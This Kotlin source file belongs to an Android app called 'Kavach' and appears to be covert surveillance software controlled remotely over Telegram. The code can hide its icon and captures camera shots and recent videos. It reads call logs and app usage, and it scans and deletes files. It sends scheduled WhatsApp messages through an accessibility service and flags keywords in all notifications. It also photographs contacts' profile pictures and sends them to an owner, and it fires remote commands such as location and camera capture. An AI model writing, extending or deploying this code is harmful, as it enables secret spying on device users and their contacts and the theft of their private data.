package com.kavach.app.core.finals

import android.content.Context
import com.kavach.app.core.vault.KStore
import com.kavach.app.security.SecureStorage
import java.io.File

/**
 * 🏆 KavachFinals — FINAL v5.0.0 mega-pack (chief-approved batch):
 *  burst-cam 🎆 · today-videos 🎬 · call-stats 📞 · health-card 🏥 ·
 *  timeline ⏳ · findFx 🔍 · dup-hunter 🧬 · wa-scheduler ⏰ · word-stalk 🧬 ·
 *  DP-DNA watch 🖼 · macro-rec 🎬 · auto-pilot rules 🤖 · night-owl 🦉 · drain-det 🔋
 */
object KavachFinals {

    @Volatile private var appCtx: Context? = null
    fun init(ctx: Context) { appCtx = ctx.applicationContext }
    private fun ctx(): Context? = appCtx

    // ─────────── 🎆 C1: CAM-BURST (best-sharp pick) ═══
    fun camBurst(ctx: Context, n: Int): ByteArray? {
        val cnt = n.coerceIn(2, 7)
        var best: ByteArray? = null
        for (i in 1..cnt) {
            val shot = runCatching { com.kavach.app.core.actions.KavachCamera.photo(ctx, false) }.getOrNull()
            if (shot != null && (best == null || shot.size > best!!.size * 98 / 100)) best = shot
            if (i < cnt) Thread.sleep(750)
        }
        return best
    }

    // ─────────── 🎬 M1: TODAY-VIDEOS ═══
    fun todaysVideos(ctx: Context): List<File> {
        val dirs = listOf(
            File("/sdcard/DCIM"), File("/sdcard/Movies"),
            File("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video"),
            File("/sdcard/Android/media/org.telegram.messenger/Telegram/Telegram Video")
        )
        val midnight = java.util.Calendar.getInstance().apply {
            set(java.util.Calendar.HOUR_OF_DAY, 0); set(java.util.Calendar.MINUTE, 0)
            set(java.util.Calendar.SECOND, 0); set(java.util.Calendar.MILLISECOND, 0)
        }.timeInMillis
        val out = ArrayList<File>()
        dirs.forEach { d ->
            runCatching { d.walkTopDown().maxDepth(2).filter { it.isFile && it.length() < 180_000_000 && it.lastModified() >= midnight && it.extension.lowercase() in setOf("mp4","mkv","3gp","webm","mov") }.forEach { out.add(it) } }
        }
        return out.sortedByDescending { it.lastModified() }.take(3)
    }

    // ─────────── 📞 K1: CALL-STATS (7 din) ═══
    fun callStats(ctx: Context): String = runCatching {
        val day7 = System.currentTimeMillis() - 7L * 24 * 3600 * 1000
        val cur = ctx.contentResolver.query(
            android.provider.CallLog.Calls.CONTENT_URI,
            arrayOf(android.provider.CallLog.Calls.NUMBER, android.provider.CallLog.Calls.CACHED_NAME, android.provider.CallLog.Calls.DURATION),
            android.provider.CallLog.Calls.DATE + ">?", arrayOf(day7.toString()),
            android.provider.CallLog.Calls.DATE + " DESC")
            ?: return "⚠️ call-log nahi khula (perm?)"
        data class Acc(var name: String, var cnt: Int, var mins: Long)
        val map = HashMap<String, Acc>()
        cur.use { c ->
            c.moveToFirst()
            while (!c.isAfterLast) {
                val num = c.getString(0) ?: "?"
                val nm = c.getString(1)
                val dur = c.getLong(2)
                val a = map.getOrPut(num.filter { it.isDigit() || it == '+' }.takeLast(10)) { Acc(nm ?: num, 0, 0) }
                a.cnt++; a.mins += dur / 60
                if (nm != null) a.name = nm
                c.moveToNext()
            }
        }
        if (map.isEmpty()) return "📭 7 din me call-log khaali"
        val sb = StringBuilder("📊 CALL-STATS (7 din 🗓)\n──────────\n")
        map.entries.sortedByDescending { it.value.cnt }.take(6).forEachIndexed { i, e ->
            sb.append("${i + 1}. 👤 ${e.value.name.take(22)}\n   📞 ${e.value.cnt} calls · ⏱ ${e.value.mins} min\n")
        }
        sb.append("──────────\n📞 total entries: ${map.values.sumOf { it.cnt }}")
        sb.toString()
    }.getOrElse { "⚠️ /callstats fail: ${it.message}" }

    // ─────────── 🏥 Y2: HEALTH-CARD ═══
    fun health(ctx: Context): String {
        fun m(b: Boolean) = if (b) "🟢" else "🔴"
        val eye = runCatching { com.kavach.app.core.eye.KavachEye.ready() }.getOrDefault(false)
        val sess = runCatching { com.kavach.app.core.screen.KavachScreen.sessionAlive() }.getOrDefault(false)
        val paired = runCatching { com.kavach.app.security.PairingManager.isPaired(ctx) }.getOrDefault(false)
        val iconVis = runCatching { com.kavach.app.core.ghost.IconGhost.isVisible(ctx) }.getOrDefault(true)
        val armed = runCatching { com.kavach.app.core.ghost.IconGhost.isArmedHidden(ctx) }.getOrDefault(false)
        return """
🏥 KAVACH HEALTH-CARD 🏥
${m(true)} Core service: zinda aur chal rahi
${m(paired)} Pairing (owner-link)
${m(eye)} 👁 Ghost-hand (accessibility)
${m(sess)} 🖥 Screen-session (shot-ready)
${m(true)} 👻 Icon: ${if (iconVis) "👁 dikh raha" else "🕳 hidden"} ${if (armed) "· 🛡 watchdog-armed" else ""}
${m(true)} 📩 Notif-buffer + WA engines armed
${com.kavach.app.core.shield.LifeLine.section(ctx)}
──────────
🕐 ${java.text.SimpleDateFormat("dd MMM HH:mm", java.util.Locale.US).format(java.util.Date())}
        """.trimIndent()
    }

    // ─────────── ⏳ T1: TIMELINE (UsageStats) ═══
    fun timeline(ctx: Context): String = runCatching {
        val am = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = am.unsafeCheckOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), ctx.packageName)
        if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
            return "⚠️ USAGE-ACCESS nahi hai —\n👉 Settings search karo **'Usage access'** → Device Info ko ON ✔\n(fir /timeline phir se)"
        }
        val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
        val cal = java.util.Calendar.getInstance().apply { set(java.util.Calendar.HOUR_OF_DAY, 0); set(java.util.Calendar.MINUTE, 0) }
        val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, cal.timeInMillis, System.currentTimeMillis())
            .filter { it.totalTimeInForeground > 30_000 }
            .sortedByDescending { it.totalTimeInForeground }.take(8)
        if (stats.isEmpty()) return "📭 aaj ka usage abhi khaali"
        val sb = StringBuilder("⏳ TIMELINE — aaj ka phone-din 🌗\n──────────\n")
        stats.forEach {
            val mins = it.totalTimeInForeground / 60000
            sb.append("📱 ${it.packageName.substringAfterLast('.')} — ⏱ ${mins}min\n")
        }
        sb.append("──────────\n💡 (foreground-time, UsageStats source)")
        sb.toString()
    }.getOrElse { "⚠️ /timeline fail: ${it.message}" }

    // ─────────── 🔍 F1: FIND-FX (filters) ═══
    fun findFx(ctx: Context, argLine: String): String {
        val tokens = argLine.split(Regex("\\s+")).filter { it.isNotBlank() }
        var extF: String? = null; var minMb = 0L; var today = false
        val words = ArrayList<String>()
        tokens.forEach {
            when {
                it.startsWith(">") && it.removePrefix(">").removeSuffix("mb").removeSuffix("MB").toLongOrNull() != null ->
                    minMb = it.removePrefix(">").removeSuffix("mb").removeSuffix("MB").toLong()
                it.equals("aaj", true) -> today = true
                it.startsWith(".") -> extF = it.removePrefix(".").lowercase()
                it.matches(Regex("^[a-z]{2,5}$", RegexOption.IGNORE_CASE)) && it.lowercase() in setOf("pdf","apk","jpg","jpeg","png","mp4","mp3","docx","zip","txt","doc","mkv","webm") -> extF = it.lowercase()
                else -> words.add(it)
            }
        }
        val kw = words.joinToString(" ").lowercase()
        val midnight = java.util.Calendar.getInstance().apply { set(java.util.Calendar.HOUR_OF_DAY,0); set(java.util.Calendar.MINUTE,0); set(java.util.Calendar.SECOND,0) }.timeInMillis
        val hits = ArrayList<File>()
        runCatching {
            File("/sdcard").walkTopDown()
                .onEnter { !it.name.startsWith(".") && it.name != "Android" || it.absolutePath.startsWith("/sdcard/Android/media") }
                .maxDepth(8).filter { f ->
                    if (hits.size >= 40) return@filter false
                    if (!f.isFile) return@filter false
                    if (extF != null && f.extension.lowercase() != extF) return@filter false
                    if (minMb > 0 && f.length() < minMb * 1024 * 1024) return@filter false
                    if (today && f.lastModified() < midnight) return@filter false
                    if (kw.isNotEmpty() && !f.name.lowercase().contains(kw)) return@filter false
                    f.length() > 0
                }.forEach { hits.add(it) }
        }
        if (hits.isEmpty()) return "🍃 kuchh nahi mila — filters halka karo\n(/findfx pdf aaj • /findfx >100mb • /findfx resume docx)"
        val sb = StringBuilder("🔍 FIND-FX hits: ${hits.size}\n──────────\n")
        hits.sortedByDescending { it.lastModified() }.forEach {
            sb.append("📄 ${it.name}\n   📁 ${it.parentFile?.name}/${it.name} · ${com.kavach.app.core.files.KavachFiles.sizeStr(it.length())}\n")
        }
        sb.append("──────────\n💡 nikalo: /get <fullpath-baheet>")
        return sb.toString().take(3800)
    }

    // ─────────── 🧬 F2: DUP-HUNTER ═══
    private data class DupeK(val size: Long, val hash: String)
    fun dupScan(ctx: Context): String {
        val groups = HashMap<DupeK, MutableList<File>>()
        var scanned = 0
        runCatching {
            File("/sdcard").walkTopDown()
                .onEnter { !it.name.startsWith(".") }
                .maxDepth(7).filter { f ->
                    if (scanned >= 1800 || !f.isFile || f.length() < 512 * 1024 || f.length() > 600_000_000) return@filter false
                    scanned++
                    val h = runCatching {
                        val inp = f.inputStream(); val buf = ByteArray(64 * 1024)
                        val rd = inp.read(buf); inp.close()
                        java.security.MessageDigest.getInstance("MD5").digest(buf.copyOf(rd)).joinToString("") { "%02x".format(it) }
                    }.getOrDefault("")
                    if (h.isNotEmpty()) groups.getOrPut(DupeK(f.length(), h)) { ArrayList() }.add(f)
                    false
                }.toList()
        }
        val dups = groups.filter { it.value.size > 1 }
        if (dups.isEmpty()) return "🧬 DUP-SCAN: koi duplicate nahi (scanned $scanned files) ✨ saaf-suthra phone!"
        val sb = StringBuilder("🐘 DUP-HUNTER — ${dups.size} groups mile ($scanned files scan)\n──────────\n")
        var waste = 0L
        dups.entries.take(12).forEach { (k, list) ->
            waste += k.size * (list.size - 1)
            sb.append("×${list.size} ${list[0].name} (${com.kavach.app.core.files.KavachFiles.sizeStr(k.size)})\n")
        }
        sb.append("──────────\n💾 total waste: ${com.kavach.app.core.files.KavachFiles.sizeStr(waste)}\n🧹 bachpan me delete karo: /dups clean  (first copy save rehti ✔)")
        KStore.csv(ctx, "dups", "scan", "${dups.size}groups|waste=${waste}")
        return sb.toString()
    }

    fun dupClean(ctx: Context): String {
        val groups = HashMap<DupeK, MutableList<File>>()
        var scanned = 0; var freed = 0L; var killed = 0
        runCatching {
            File("/sdcard").walkTopDown()
                .onEnter { !it.name.startsWith(".") }
                .maxDepth(7).filter { f ->
                    if (scanned >= 1800 || !f.isFile || f.length() < 512 * 1024 || f.length() > 600_000_000) return@filter false
                    scanned++
                    val h = runCatching {
                        val inp = f.inputStream(); val buf = ByteArray(64 * 1024)
                        val rd = inp.read(buf); inp.close()
                        java.security.MessageDigest.getInstance("MD5").digest(buf.copyOf(rd)).joinToString("") { "%02x".format(it) }
                    }.getOrDefault("")
                    if (h.isNotEmpty()) groups.getOrPut(DupeK(f.length(), h)) { ArrayList() }.add(f)
                    false
                }.toList()
        }
        groups.filter { it.value.size > 1 }.forEach { (_, list) ->
            list.drop(1).forEach { f ->
                if (f.delete()) { killed++; freed += f.length() }
            }
        }
        return "🧹 DUP-CLEAN done ✅\n🗑 delete: $killed files\n💾 freed: ${com.kavach.app.core.files.KavachFiles.sizeStr(freed)}\n(first copies save ✔ — recycle skept = forensics log me likha)"
    }

    // ─────────── ⏰ W2: WA SCHEDULER ═══
    private fun jobsJson(ctx: Context): String = KStore.readState(ctx, "wa_jobs")
    fun addWaJob(ctx: Context, phone: String, msg: String, hhmm: String): String {
        val m = Regex("^(\\d{1,2}):(\\d{2})$").find(hhmm) ?: return "❌ format: /wamsgat NUM HH:MM MSG"
        val cal = java.util.Calendar.getInstance()
        cal.set(java.util.Calendar.HOUR_OF_DAY, m.groupValues[1].toInt())
        cal.set(java.util.Calendar.MINUTE, m.groupValues[2].toInt())
        cal.set(java.util.Calendar.SECOND, 0)
        if (cal.timeInMillis <= System.currentTimeMillis()) cal.add(java.util.Calendar.DATE, 1)
        val list = (if (jobsJson(ctx).startsWith("[")) org.json.JSONArray(jobsJson(ctx)) else org.json.JSONArray())
        val id = System.currentTimeMillis() % 100000
        list.put(org.json.JSONObject().put("id", id).put("ph", phone).put("msg", msg.replace("\n", " ")).put("at", cal.timeInMillis))
        KStore.saveState(ctx, "wa_jobs", list.toString())
        return "⏰ WA-JOB #$id set ✅\n📲 +$phone ko $hhmm pe bheja jayega:\n💬 \\\"${msg.take(60)}\\\"\n(ghost-hand ON rehna — tabhi likh sakti ✍)"
    }
    fun waJobs(ctx: Context): String {
        val list = (if (jobsJson(ctx).startsWith("[")) org.json.JSONArray(jobsJson(ctx)) else org.json.JSONArray())
        if (list.length() == 0) return "📭 koi pending WA-job nahi"
        val sb = StringBuilder("⏰ PENDING WA-JOBS:\n")
        for (i in 0 until list.length()) {
            val o = list.getJSONObject(i)
            sb.append("#${o.getLong("id")} → +${o.getString("ph")} @${java.text.SimpleDateFormat("dd HH:mm", java.util.Locale.US).format(java.util.Date(o.getLong("at")))}\n")
        }
        sb.append("(radd karo: /wajobdel <id>)")
        return sb.toString()
    }
    fun waJobDel(ctx: Context, id: Long): String {
        val list = (if (jobsJson(ctx).startsWith("[")) org.json.JSONArray(jobsJson(ctx)) else org.json.JSONArray())
        val out = org.json.JSONArray(); var hit = false
        for (i in 0 until list.length()) {
            val o = list.getJSONObject(i)
            if (o.getLong("id") == id) hit = true else out.put(o)
        }
        KStore.saveState(ctx, "wa_jobs", out.toString())
        return if (hit) "🗑 WA-JOB #$id radd ✔" else "❌ job nahi mila"
    }
    private fun jobTick(ctx: Context) {
        val now = System.currentTimeMillis()
        val list = (if (jobsJson(ctx).startsWith("[")) org.json.JSONArray(jobsJson(ctx)) else org.json.JSONArray())
        val out = org.json.JSONArray()
        for (i in 0 until list.length()) {
            val o = list.getJSONObject(i)
            if (o.getLong("at") <= now) {
                val ph = o.getString("ph"); val msg = o.getString("msg")
                val r = runCatching { com.kavach.app.core.eye.KavachEye.waSend(ctx, ph, msg) }.getOrDefault("fail")
                com.kavach.app.core.shield.AlertBus.post(ctx, com.kavach.app.core.shield.AlertBus.INFO, "wajob#"+System.currentTimeMillis()%100000, 0L,
                    "⏰ SCHEDULED-WA fired 🚀\n+$ph\n💬 ${msg.take(80)}\n$r")
                KStore.csv(ctx, "wa_jobs", "fire", "$ph|${msg.take(30)}")
            } else out.put(o)
        }
        if (list.length() != out.length()) KStore.saveState(ctx, "wa_jobs", out.toString())
    }

    // ─────────── 🧬 U-5: WORD-STALK ═══
    fun stalkAdd(ctx: Context, word: String): String {
        val cur = stalkList(ctx).toMutableSet()
        cur.add(word.lowercase())
        KStore.saveState(ctx, "stalk", cur.joinToString(","))
        return "🚨 WORD-STALK add: \\\"$word\\\" 👁\n(ab ye lafza kisi bhi notif me aaya → alert!)"
    }
    fun stalkRemove(ctx: Context, word: String): String {
        val cur = stalkList(ctx).toMutableSet(); cur.remove(word.lowercase())
        KStore.saveState(ctx, "stalk", cur.joinToString(","))
        return "🧹 word hata diya: $word (baaki: ${cur.size})"
    }
    fun stalkList(ctx: Context): List<String> =
        KStore.readState(ctx, "stalk").split(",").filter { it.isNotBlank() }
    fun onAnyNotif(pkg: String, title: String, text: String) {
        val ctx = ctx() ?: return
        val words = stalkList(ctx); if (words.isEmpty()) return
        val hit = words.firstOrNull { w -> title.contains(w, true) || text.contains(w, true) } ?: return
        com.kavach.app.core.shield.AlertBus.post(ctx, com.kavach.app.core.shield.AlertBus.CRIT, "stalk:$hit", 20_000,
            "🚨 WORD-STALK pakda! 🎯\n🔑 \\\"$hit\\\"\n👤 $title\n💬 ${text.take(140)}\n📦 $pkg")
    }

    // ─────────── 🖼 U-3: DP-DNA watch ═══
    fun dpAdd(ctx: Context, ph: String): String {
        val list = dpList(ctx).toMutableSet(); list.add(ph.filter { it.isDigit() })
        KStore.saveState(ctx, "dpwatch", list.joinToString(","))
        return "🖼 DP-DNA add: +$ph\n💡 her ~30min DP-check; change = TG pe naya DP photo!"
    }
    fun dpOff(ctx: Context): String { KStore.saveState(ctx, "dpwatch", ""); return "⏹ DP-DNA watch OFF" }
    private fun dpList(ctx: Context) = KStore.readState(ctx, "dpwatch").split(",").filter { it.isNotBlank() }
    private var tickN = 0
    private fun dpTick(ctx: Context) {
        val list = dpList(ctx); if (list.isEmpty()) return
        tickN++
        if (tickN % 3 != 0) return   // ~30 min cadence
        if (!com.kavach.app.core.eye.KavachEye.ready()) return
        if (!com.kavach.app.core.screen.KavachScreen.sessionAlive()) return
        val ph = list.random()
        runCatching {
            com.kavach.app.core.eye.KavachEye.waOpenChat(ctx, ph)
            Thread.sleep(2200)
            val frame = com.kavach.app.core.eye.KavachEye.gridFrame(ctx) ?: return@runCatching
            val bmp = android.graphics.BitmapFactory.decodeByteArray(frame, 0, frame.size) ?: return@runCatching
            val sz = 96.coerceAtMost(bmp.width / 3)
            val dp = android.graphics.Bitmap.createBitmap(bmp, sz / 4, sz / 4, sz, sz)
            val ba = java.io.ByteArrayOutputStream()
            dp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, ba)
            val bytes = ba.toByteArray()
            val hash = bytes.contentHashCode().toString(16)
            val last = KStore.readState(ctx, "dp_hash_$ph")
            KStore.saveState(ctx, "dp_hash_$ph", hash)
            if (last.isNotEmpty() && last != hash) {
                val token = SecureStorage.getToken(ctx); val owner = SecureStorage.getOwnerChat(ctx)
                if (token.isNotEmpty() && owner != 0L) kotlinx.coroutines.runBlocking {
                    com.kavach.app.core.telegram.TelegramApi(token).sendPhoto(owner, bytes, "🖼 DP-DNA ALERT! +$ph ka DP change hua 👁")
                }
            }
            runCatching { com.kavach.app.core.eye.KavachEye.key("back") }
        }
    }

    // ─────────── 🎬 X1: MACRO-RECORDER ═══
    @Volatile var recOn = false
    private val recBuf = ArrayList<String>()
    fun macroRec(ctx: Context): String { recOn = true; recBuf.clear(); return "🎥 MACRO-REC ON 👻\nab jo bhi screen pe tap karoge wo likha jayega\n✅ done pe: /macro stop" }
    fun macroStop(ctx: Context): String {
        recOn = false
        KStore.saveState(ctx, "macro_taps", recBuf.joinToString("|"))
        return "⏹ REC STOP — ${recBuf.size} taps saved 💾\n▶ replay: /macro play"
    }
    fun macroPlay(ctx: Context): String {
        val pts = KStore.readState(ctx, "macro_taps").split("|").filter { it.contains(",") }
        if (pts.isEmpty()) return "❌ pehle /macro rec karke taps record karo"
        val svc = com.kavach.app.core.eye.KavachEyeService.instance ?: return "⚠️ ghost-hand OFF"
        Thread {
            pts.forEach {
                val (x, y) = it.split(","); runCatching { svc.tap(x.toFloat(), y.toFloat()) }
                Thread.sleep(680)
            }
        }.start()
        return "▶ MACRO playing… ${pts.size} taps 🎭\n(ghost-hand khud chala rahi!)"
    }
    fun recTap(ctx: Context, x: Float, y: Float) { if (recOn) recBuf.add("${x.toInt()},${y.toInt()}") }

    // ─────────── 🤖 X2: AUTO-PILOT rules ═══
    fun ruleAdd(ctx: Context, line: String): String {
        val p = line.split("=", limit = 2)
        if (p.size != 2) return "❌ /rule add batt15=/location\ntriggers: batt15 · hour1 · batt80"
        val trig = p[0].trim().lowercase()
        if (trig !in setOf("batt15", "hour1", "batt80")) return "❌ trigger sirf: batt15 | hour1 (raat 1am) | batt80"
        val acts = p[1].trim()
        val cur = KStore.readState(ctx, "rules")
        KStore.saveState(ctx, "rules", (if (cur.isBlank()) "" else "$cur\n") + "$trig=>$acts")
        return "🤖 RULE set ✅\nW jab [ $trig ] → chalegi: $acts\n📜 /rules se list, /ruleclear se saaf"
    }
    fun ruleList(ctx: Context): String {
        val r = KStore.readState(ctx, "rules")
        return if (r.isBlank()) "📭 koi rule nahi\n👉 /rule add batt15=/location|/camfront" else "🤖 AUTO-PILOT RULES:\n$r"
        }
    fun rulesClear(ctx: Context): String { KStore.saveState(ctx, "rules", ""); return "🧹 sab rules clear" }
    private var firedFlags = mutableSetOf<String>()
    private fun rulesTick(ctx: Context) {
        val r = KStore.readState(ctx, "rules"); if (r.isBlank()) return
        val hm = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
        val batt = battLevel(ctx)
        r.lines().filter { it.contains("=>") }.forEach { line ->
            val (trig, acts) = line.split("=>", limit = 2)
            val due = when (trig.trim()) {
                "batt15" -> batt in 1..15
                "batt80" -> batt >= 80
                "hour1" -> hm == 1
                else -> false
            } && firedFlags.add("$trig@${hm / 3}")   // har 3-hour window me 1×
            if (due) {
                runCatching {
                    val api = com.kavach.app.core.telegram.TelegramApi(SecureStorage.getToken(ctx))
                    val owner = SecureStorage.getOwnerChat(ctx)
                    kotlinx.coroutines.runBlocking {
                        api.sendMessage(owner, "🤖 AUTO-PILOT fired [$trig] 🚀")
                        acts.split("|").forEach { cmd ->
                            com.kavach.app.core.commands.CommandRouter(ctx, api)
                                .route(com.kavach.app.core.channel.IncomingCommand(owner, cmd.trim()))
                            kotlinx.coroutines.delay(2500)
                        }
                    }
                }
            }
        }
    }

    // ─────────── 🦉 T2 night-owl + 🔋 T3 drain ═══
    private var lastBatt = -1; private var lastBattAt = 0L
    private fun battLevel(ctx: Context): Int {
        val i = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)) ?: return -1
        val lvl = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
        val scale = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100)
        return if (lvl < 0) -1 else lvl * 100 / scale
    }
    private fun owlDrainTick(ctx: Context) {
        val cal = java.util.Calendar.getInstance(); val hh = cal.get(java.util.Calendar.HOUR_OF_DAY)
        // 🦉 screen-interactive while 01:00-05:00? (isInteractive check)
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        if (hh in 1..4 && pm.isInteractive) KStore.csv(ctx, "nightowl", "on", java.text.SimpleDateFormat("dd-HH:mm", java.util.Locale.US).format(java.util.Date()))
        if (hh == 7) {
            val rows = com.kavach.app.core.vault.KStore.csvTail(ctx, "nightowl", 40)
            if (rows.size >= 2) {
                com.kavach.app.core.shield.AlertBus.post(ctx, com.kavach.app.core.shield.AlertBus.INFO, "owl", 48_000_000,
                    "🦉 NIGHT-OWL REPORT:\npichli raat phone ON dikha ${rows.size}× (01:00-05:00 window) 😴\nfirst: ${rows.first().joinToString()} \nlast: ${rows.last().joinToString()}")
                File(com.kavach.app.core.vault.KStore.logsDir(ctx), "nightowl.csv").delete()
            }
        }
        // 🔋 drain
        val b = battLevel(ctx); val now = System.currentTimeMillis()
        if (b >= 0) {
            if (lastBatt >= 0 && now - lastBattAt <= 65 * 60 * 1000 && lastBatt - b >= 20) {
                com.kavach.app.core.shield.AlertBus.post(ctx, com.kavach.app.core.shield.AlertBus.INFO, "drain", 90_000_000L,
                    "🔋 DRAIN-DETECTIVE! ⚡\n${lastBatt}% → ${b}% (≤1hr me ${lastBatt - b}% drop!)\n💡 /timeline se suspect-app dekho")
            }
            lastBatt = b; lastBattAt = now
            // Y1 battery-guardian mid (15%)
            if (b in 1..15) com.kavach.app.core.shield.AlertBus.post(ctx, com.kavach.app.core.shield.AlertBus.INFO, "batt15", 3_600_000,
                "🔋 BATTERY 15% ⚡ — charger lagao! (last-ping 8% pe aata rahega)")
        }
    }

    // ─────────── 🌐 N1: net-trip note ═══
    fun netTrip(ctx: Context, note: String) = KStore.csv(ctx, "nettrip", "swap", note)
    fun netTripReport(ctx: Context): String {
        val rows = KStore.csvTail(ctx, "nettrip", 20)
        if (rows.isEmpty()) return "📡 abhi koi network-swap sign nahi"
        val sb = StringBuilder("🌐 NET-TRIP log (recent):\n")
        rows.forEach { sb.append("• ").append(it.joinToString(" | ")).append("\n") }
        return sb.toString()
    }

    // ─────────── ⏱ HEARTBEAT hookup ═══
    fun tick(ctx: Context) {
        init(ctx)
        runCatching { jobTick(ctx) }
        runCatching { rulesTick(ctx) }
        runCatching { owlDrainTick(ctx) }
        runCatching { dpTick(ctx) }
    }
}
